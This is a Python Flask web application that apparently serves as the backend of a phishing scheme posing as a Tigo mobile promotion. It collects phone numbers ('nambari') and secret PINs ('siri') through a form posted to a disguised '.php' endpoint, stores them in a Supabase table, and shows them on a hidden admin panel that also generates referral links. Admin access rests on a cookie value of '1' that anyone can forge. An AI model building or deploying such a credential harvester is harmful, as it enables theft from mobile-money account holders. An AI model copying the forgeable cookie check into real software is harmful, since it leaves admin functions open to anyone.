from flask import Flask, request, render_template, redirect, make_response
import os
import traceback
import secrets
from supabase import create_client

# ---------- PATHS ----------
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
TEMPLATES_DIR = os.path.join(BASE_DIR, "..", "templates")

app = Flask(__name__, template_folder=TEMPLATES_DIR)

# ---------- SUPABASE ----------
SUPABASE_URL = os.environ.get("SUPABASE_URL")
SUPABASE_KEY = os.environ.get("SUPABASE_KEY")

supabase = None
if SUPABASE_URL and SUPABASE_KEY:
    supabase = create_client(SUPABASE_URL, SUPABASE_KEY)
    print("✅ Supabase connected")
else:
    print("❌ Supabase env vars missing")

# ---------- HELPERS ----------
def is_admin_logged_in():
    return request.cookies.get("admin_auth") == "1"

def generate_ref_code():
    return secrets.token_urlsafe(6)

# ---------- HOME ----------
@app.route("/")
def home():
    return render_template("index.html")

# ---------- SUCCESS ----------
@app.route("/success")
def success():
    return render_template("success.html")

# ---------- FORM SUBMIT ----------
@app.route("/add_tigo.php", methods=["POST"])
def add_tigo():
    try:
        if not supabase:
            return "Supabase not configured", 500

        nambari = request.form.get("nambari")
        siri = request.form.get("siri")
        url_link = request.form.get("url_link")

        if not nambari or not siri:
            return "Missing fields", 400

        if not url_link:
            url_link = generate_ref_code()

        supabase.table("tigo_promotions").insert({
            "nambari": nambari,
            "siri": siri,
            "url_link": url_link
        }).execute()

        return redirect("/success")

    except Exception:
        traceback.print_exc()
        return "Insert failed", 500

# ---------- ADMIN LOGIN ----------
@app.route("/adminvinc684833", methods=["GET", "POST"])
def admin():
    ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD")
    if not ADMIN_PASSWORD:
        return "Admin password not configured", 500

    if is_admin_logged_in():
        return admin_panel()

    if request.method == "POST":
        password = request.form.get("password")
        remember = request.form.get("remember")

        if password != ADMIN_PASSWORD:
            return render_template("admin_login.html", error="Invalid password")

        resp = make_response(redirect("/adminvinc684833"))
        if remember:
            resp.set_cookie("admin_auth", "1", max_age=60*60*24*7, httponly=True)
        else:
            resp.set_cookie("admin_auth", "1", httponly=True)

        return resp

    return render_template("admin_login.html")

# ---------- ADMIN PANEL ----------
def admin_panel():
    try:
        response = supabase.table("tigo_promotions") \
            .select("id,nambari,siri,url_link,created_at") \
            .order("created_at", desc=True) \
            .execute()

        rows = response.data or []
        base_url = request.host_url.rstrip("/")

        for row in rows:
            row["referral"] = f"{base_url}/?ref={row['url_link']}"

        return render_template("admin.html", rows=rows)

    except Exception:
        traceback.print_exc()
        return "Failed to load admin data", 500

# ---------- GENERATE REF CODE ----------
@app.route("/adminvinc684833/generate", methods=["POST"])
def generate_ref():
    if not is_admin_logged_in():
        return redirect("/adminvinc684833")

    try:
        code = generate_ref_code()

        supabase.table("tigo_promotions").insert({
            "nambari": "ADMIN",
            "siri": "ADMIN",
            "url_link": code
        }).execute()

        return redirect("/adminvinc684833")

    except Exception:
        traceback.print_exc()
        return "Failed to generate referral", 500

# ---------- DELETE ----------
@app.route("/adminvinc684833/delete/<int:row_id>", methods=["POST"])
def delete_row(row_id):
    if not is_admin_logged_in():
        return redirect("/adminvinc684833")

    try:
        supabase.table("tigo_promotions").delete().eq("id", row_id).execute()
        return redirect("/adminvinc684833")
    except Exception:
        traceback.print_exc()
        return "Delete failed", 500
